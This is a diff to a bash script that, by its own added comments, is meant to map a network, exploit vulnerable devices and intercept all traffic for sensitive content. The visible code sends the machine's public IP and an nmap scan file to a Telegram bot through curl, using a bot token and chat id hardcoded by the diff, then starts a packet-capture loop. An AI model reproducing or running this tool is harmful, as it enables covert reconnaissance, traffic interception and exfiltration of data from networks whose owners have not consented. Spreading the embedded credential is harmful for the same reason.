@@ -1,3 +1,11 @@
+#1. Get Network name
+#2. Get Public Ip
+#3. Find all Devices connected
+	#3.1 Find vulnerability devices
+	#3.2 Exploit vulnerability devices
+#4. Intercept all traffic
+	#4.1 Get Sensitive content
+
 #!/bin/bash
 wget -q --spider http://google.com
 current_date=$(date "+%d-%m-%Y")
@@ -26,17 +34,17 @@ if [ $? -eq 0 ]; then
 	echo "Public ip: $public_ip"
 	
 	# Send report via telegram
-	token=""
+	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
 	# chat id
-	chat_id=""
+	chat_id="1789487661"
 	filepath1=$nmap_output_file
 	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="$public_ip"
 	curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
 	rm "$filepath1"
 	
+	echo "Start intercepting..."
 	while true
 	do
-		echo "Start intercepting..."
 		# Max size of file .pcap
 		MAX_FILE_SIZE=200000000  # 200MB in byte
 		# Name of file 
